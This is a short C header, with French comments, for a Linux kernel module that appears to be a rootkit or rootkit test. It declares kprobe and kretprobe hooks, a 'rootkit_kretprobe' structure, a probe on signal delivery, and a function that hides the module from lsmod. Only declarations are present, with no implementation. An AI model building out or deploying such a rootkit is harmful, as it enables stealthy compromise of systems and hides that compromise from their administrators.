#ifndef ROOTEST_H
#define ROOTEST_H

#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>

// Fonctions de test kprobes
int kprobes_init(void);
void kprobes_exit(void);
int kprobe_handler(struct kprobe *p, struct pt_regs *regs);

// Prototype pour le gestionnaire de retour de kretprobe
int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs);

// Déclaration externe des structs de probes pour utilisation dans les fichiers C
extern struct kretprobe rootkit_kretprobe;
extern struct kprobe sig_kp;

// Fonctions de dissimulation du module
void hide_from_lsmod(void);

// Probe sur l'envoi de signal aux processus
int handle_signal_send(struct kprobe *kp, struct pt_regs *regs);

#endif 

